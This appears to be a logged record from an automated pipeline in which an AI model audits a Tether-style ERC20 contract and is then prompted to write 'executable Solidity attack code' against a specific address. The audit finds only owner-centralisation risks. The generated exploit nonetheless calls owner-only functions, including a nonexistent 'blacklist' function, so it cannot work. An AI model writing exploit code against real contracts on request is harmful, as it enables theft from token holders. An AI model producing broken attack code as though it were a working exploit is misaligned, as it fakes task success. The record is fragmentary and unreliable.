{\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. **Contract Analysis:**\n\nThe main contract with business logic and user funds is **TetherToken**, which is an ERC20 token contract with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- It supports pausing/unpausing by the owner.\n- It supports blacklisting addresses and destroying blacklisted funds.\n- It supports an upgrade mechanism via `deprecated` flag and forwarding calls to an upgraded contract.\n- It supports issuing and redeeming tokens by the owner.\n- It supports fees on transfers (basis points and max fee), though initially set to zero.\n- It uses `SafeMath` for arithmetic safety.\n- It has protections against short address attacks (`onlyPayloadSize` modifier).\n- It restricts approvals to mitigate the known ERC20 race condition.\n- Ownership and administrative functions are restricted to the owner.\n\nOther contracts (`Ownable`, `Pausable`, `BlackList`, `StandardToken`, `BasicToken`, `SafeMath`) are standard utility or base contracts and do not hold funds or business logic beyond supporting `TetherToken`.\n\n2. **Vulnerability Assessment:**\n\n- **Centralized Control / Owner Privileges:**\n  - The owner has extensive control:\n    - Can pause/unpause the contract, halting all transfers.\n    - Can add/remove addresses from blacklist.\n    - Can destroy blacklisted users‚Äô tokens, effectively burning their balances.\n    - Can issue new tokens arbitrarily, increasing total supply and owner balance.\n    - Can redeem tokens, reducing total supply and owner balance.\n    - Can deprecate the contract and redirect calls to an upgraded contract.\n    - Can set transfer fee parameters.\n  - **Impact:** This centralization means the owner can censor users, freeze funds, burn tokens from blacklisted users, and inflate the token supply arbitrarily. This is a trust assumption and a potential economic risk for token holders.\n\n- **No Timelocks or Multisig for Owner Actions:**\n  - All owner functions are single-sig and immediate.\n  - **Impact:** If the owner key is compromised, attacker can perform all privileged actions instantly.\n\n- **Blacklisting and Destroying Funds:**\n  - The owner can blacklist any address and destroy its tokens.\n  - **Impact:** This can be used maliciously to confiscate tokens from any user without recourse.\n\n- **Upgrade Mechanism Risks:**\n  - The contract can be deprecated and calls forwarded to an upgraded contract.\n  - The upgrade address is set by the owner.\n  - No on-chain verification or user consent is required.\n  - **Impact:** Owner can redirect token operations to any contract, potentially malicious, causing loss of funds or unexpected behavior.\n\n- **No Reentrancy Issues:**\n  - The contract does not hold or send ETH.\n  - No external calls in state-changing functions that would cause reentrancy.\n  - SafeMath used everywhere.\n\n- **No Arithmetic Vulnerabilities:**\n  - SafeMath used for all arithmetic operations.\n  - Checks for overflows/underflows present.\n\n- **ERC20 Approve Race Condition Mitigation:**\n  - The `approve` function requires allowance to be zero before setting a non-zero value.\n  - This mitigates the known ERC20 race condition.\n\n- **Short Address Attack Mitigation:**\n  - `onlyPayloadSize` modifier used on transfer, transferFrom, approve.\n\n- **Fee Parameters:**\n  - Owner can set fees but capped to max 0.2% (basisPoints < 20) and max fee < 50 tokens (adjusted by decimals).\n  - Fees go to owner.\n  - Initially fees are zero.\n\n- **No ETH Handling:**\n  - Contract does not accept or hold ETH.\n  - No payable functions.\n\n3. **Exploitation Requirements:**\n\n- To exploit the centralization risks, an attacker must:\n  - Gain control of the owner private key.\n  - Or collude with the owner.\n\n- No direct technical exploits (reentrancy, overflow, underflow, etc.) are present.\n\n- Economic exploit:\n  - Owner can mint unlimited tokens via `issue()`, diluting existing holders.\n  - Owner can blacklist and destroy tokens of any user.\n  - Owner can pause the contract to freeze transfers.\n  - Owner can upgrade to malicious contract.\n\n- Setup for exploitation:\n  - Ownership compromise or malicious owner.\n  - No user action required.\n\n---\n\n**Summary:**\n\n- **Solidity version:** pragma solidity ^0.4.17;\n\n- **No technical vulnerabilities** such as reentrancy, arithmetic bugs, or unsafe calls detected.\n\n- **Centralization and owner privilege risks** are the main concern:\n  - Owner can mint tokens arbitrarily.\n  - Owner can blacklist and destroy user tokens.\n  - Owner can pause the contract.\n  - Owner can upgrade to a malicious contract.\n  - No multisig or timelock protections.\n\n- **Users must trust the owner** to act honestly; otherwise, funds can be frozen, destroyed, or diluted.\n\n# Final recommendation:\n\n- Consider adding multisig or timelock for owner functions.\n- Consider decentralizing control or adding governance.\n- Inform users of the centralized control risks.', 'contract_analysis': '**\n\nThe main contract with business logic and user funds is **TetherToken**, which is an ERC20 token contract with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- It supports pausing/unpausing by the owner.\n- It supports blacklisting addresses and destroying blacklisted funds.\n- It supports an upgrade mechanism via `deprecated` flag and forwarding calls to an upgraded contract.\n- It supports issuing and redeeming tokens by the owner.\n- It supports fees on transfers (basis points and max fee), though initially set to zero.\n- It uses `SafeMath` for arithmetic safety.\n- It has protections against short address attacks (`onlyPayloadSize` modifier).\n- It restricts approvals to mitigate the known ERC20 race condition.\n- Ownership and administrative functions are restricted to the owner.\n\nOther contracts (`Ownable`, `Pausable`, `BlackList`, `StandardToken`, `BasicToken`, `SafeMath`) are standard utility or base contracts and do not hold funds or business logic beyond supporting `TetherToken`.\n\n2. **', 'vulnerability_assessment': '**\n\n- **Centralized Control / Owner Privileges:**\n  - The owner has extensive control:\n    - Can pause/unpause the contract, halting all transfers.\n    - Can add/remove addresses from blacklist.\n    - Can destroy blacklisted users‚Äô tokens, effectively burning their balances.\n    - Can issue new tokens arbitrarily, increasing total supply and owner balance.\n    - Can redeem tokens, reducing total supply and owner balance.\n    - Can deprecate the contract and redirect calls to an upgraded contract.\n    - Can set transfer fee parameters.\n  - **Impact:** This centralization means the owner can censor users, freeze funds, burn tokens from blacklisted users, and inflate the token supply arbitrarily. This is a trust assumption and a potential economic risk for token holders.\n\n- **No Timelocks or Multisig for Owner Actions:**\n  - All owner functions are single-sig and immediate.\n  - **Impact:** If the owner key is compromised, attacker can perform all privileged actions instantly.\n\n- **Blacklisting and Destroying Funds:**\n  - The owner can blacklist any address and destroy its tokens.\n  - **Impact:** This can be used maliciously to confiscate tokens from any user without recourse.\n\n- **Upgrade Mechanism Risks:**\n  - The contract can be deprecated and calls forwarded to an upgraded contract.\n  - The upgrade address is set by the owner.\n  - No on-chain verification or user consent is required.\n  - **Impact:** Owner can redirect token operations to any contract, potentially malicious, causing loss of funds or unexpected behavior.\n\n- **No Reentrancy Issues:**\n  - The contract does not hold or send ETH.\n  - No external calls in state-changing functions that would cause reentrancy.\n  - SafeMath used everywhere.\n\n- **No Arithmetic Vulnerabilities:**\n  - SafeMath used for all arithmetic operations.\n  - Checks for overflows/underflows present.\n\n- **ERC20 Approve Race Condition Mitigation:**\n  - The `approve` function requires allowance to be zero before setting a non-zero value.\n  - This mitigates the known ERC20 race condition.\n\n- **Short Address Attack Mitigation:**\n  - `onlyPayloadSize` modifier used on transfer, transferFrom, approve.\n\n- **Fee Parameters:**\n  - Owner can set fees but capped to max 0.2% (basisPoints < 20) and max fee < 50 tokens (adjusted by decimals).\n  - Fees go to owner.\n  - Initially fees are zero.\n\n- **No ETH Handling:**\n  - Contract does not accept or hold ETH.\n  - No payable functions.\n\n3. **', 'exploitation_requirements': '**\n\n- To exploit the centralization risks, an attacker must:\n  - Gain control of the owner private key.\n  - Or collude with the owner.\n\n- No direct technical exploits (reentrancy, overflow, underflow, etc.) are present.\n\n- Economic exploit:\n  - Owner can mint unlimited tokens via `issue()`, diluting existing holders.\n  - Owner can blacklist and destroy tokens of any user.\n  - Owner can pause the contract to freeze transfers.\n  - Owner can upgrade to malicious contract.\n\n- Setup for exploitation:\n  - Ownership compromise or malicious owner.\n  - No user action required.', 'analysis_duration': 22.897302389144897}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: **\n\nThe main contract with business logic and user funds is **TetherToken**, which is an ERC20 token contract with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- It supports pausing/unpausing by the owner.\n- It supports blacklisting addresses and destroying blacklisted funds.\n- It supports an upgrade mechanism via `deprecated` flag and forwarding calls to an upgraded contract.\n- It supports issuing and redeeming tokens by the owner.\n- It supports fees on transfers (basis points and max fee), though initially set to zero.\n- It uses `SafeMath` for arithmetic safety.\n- It has protections against short address attacks (`onlyPayloadSize` modifier).\n- It restricts approvals to mitigate the known ERC20 race condition.\n- Ownership and administrative functions are restricted to the owner.\n\nOther contracts (`Ownable`, `Pausable`, `BlackList`, `StandardToken`, `BasicToken`, `SafeMath`) are standard utility or base contracts and do not hold funds or business logic beyond supporting `TetherToken`.\n\n2. **\n\nVulnerability Assessment: **\n\n- **Centralized Control / Owner Privileges:**\n  - The owner has extensive control:\n    - Can pause/unpause the contract, halting all transfers.\n    - Can add/remove addresses from blacklist.\n    - Can destroy blacklisted users‚Äô tokens, effectively burning their balances.\n    - Can issue new tokens arbitrarily, increasing total supply and owner balance.\n    - Can redeem tokens, reducing total supply and owner balance.\n    - Can deprecate the contract and redirect calls to an upgraded contract.\n    - Can set transfer fee parameters.\n  - **Impact:** This centralization means the owner can censor users, freeze funds, burn tokens from blacklisted users, and inflate the token supply arbitrarily. This is a trust assumption and a potential economic risk for token holders.\n\n- **No Timelocks or Multisig for Owner Actions:**\n  - All owner functions are single-sig and immediate.\n  - **Impact:** If the owner key is compromised, attacker can perform all privileged actions instantly.\n\n- **Blacklisting and Destroying Funds:**\n  - The owner can blacklist any address and destroy its tokens.\n  - **Impact:** This can be used maliciously to confiscate tokens from any user without recourse.\n\n- **Upgrade Mechanism Risks:**\n  - The contract can be deprecated and calls forwarded to an upgraded contract.\n  - The upgrade address is set by the owner.\n  - No on-chain verification or user consent is required.\n  - **Impact:** Owner can redirect token operations to any contract, potentially malicious, causing loss of funds or unexpected behavior.\n\n- **No Reentrancy Issues:**\n  - The contract does not hold or send ETH.\n  - No external calls in state-changing functions that would cause reentrancy.\n  - SafeMath used everywhere.\n\n- **No Arithmetic Vulnerabilities:**\n  - SafeMath used for all arithmetic operations.\n  - Checks for overflows/underflows present.\n\n- **ERC20 Approve Race Condition Mitigation:**\n  - The `approve` function requires allowance to be zero before setting a non-zero value.\n  - This mitigates the known ERC20 race condition.\n\n- **Short Address Attack Mitigation:**\n  - `onlyPayloadSize` modifier used on transfer, transferFrom, approve.\n\n- **Fee Parameters:**\n  - Owner can set fees but capped to max 0.2% (basisPoints < 20) and max fee < 50 tokens (adjusted by decimals).\n  - Fees go to owner.\n  - Initially fees are zero.\n\n- **No ETH Handling:**\n  - Contract does not accept or hold ETH.\n  - No payable functions.\n\n3. **\n\nExploitation Requirements: **\n\n- To exploit the centralization risks, an attacker must:\n  - Gain control of the owner private key.\n  - Or collude with the owner.\n\n- No direct technical exploits (reentrancy, overflow, underflow, etc.) are present.\n\n- Economic exploit:\n  - Owner can mint unlimited tokens via `issue()`, diluting existing holders.\n  - Owner can blacklist and destroy tokens of any user.\n  - Owner can pause the contract to freeze transfers.\n  - Owner can upgrade to malicious contract.\n\n- Setup for exploitation:\n  - Ownership compromise or malicious owner.\n  - No user action required.\n\n\nTarget Contract Address: 0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.4.17\n", 'attack_raw_response': '```solidity\npragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function issue(uint amount) external;\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function pause() external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenExploit {\n    ITetherToken public target;\n\n    function TetherTokenExploit(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgraded) public {\n        target.issue(1000000 ether);\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.pause();\n        target.deprecate(upgraded);\n    }\n}\n```', 'code': 'pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function issue(uint amount) external;\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function pause() external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenExploit {\n    ITetherToken public target;\n\n    function TetherTokenExploit(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgraded) public {\n        target.issue(1000000 ether);\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.pause();\n        target.deprecate(upgraded);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 3.418316125869751}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpfo1636da.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857894140000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint 